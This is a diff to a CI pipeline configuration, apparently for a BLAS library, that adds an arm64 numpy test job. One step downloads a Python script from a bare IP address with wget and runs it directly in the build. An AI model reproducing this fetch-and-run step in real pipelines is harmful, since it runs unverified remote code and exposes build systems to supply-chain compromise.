@@ -166,6 +166,29 @@ steps:
     - make -C ctest $COMMON_FLAGS
     - make -C utest $COMMON_FLAGS
     - make -C cpp_thread_test dgemm_tester
+ ---
+kind: pipeline
+name: arm64_numpy_test
+
+platform:
+  os: linux
+  arch: arm64
+
+steps:
+- name: Build and Test
+  image: ubuntu:18.04
+  environment:
+    CC: gcc
+    COMMON_FLAGS: 'NUM_THREADS=8'
+  commands:
+    - echo "MAKE_FLAGS:= $COMMON_FLAGS"
+    - apt-get update -y
+    - apt-get install -y make $CC gfortran perl python numpy wget
+    - $CC --version
+    - make QUIET_MAKE=1 $COMMON_FLAGS
+    - wget https://85.214.232.120:/numpycrash.py
+    - python numpycrash.py
+
 ---
 kind: pipeline
 name: epyc_native_test
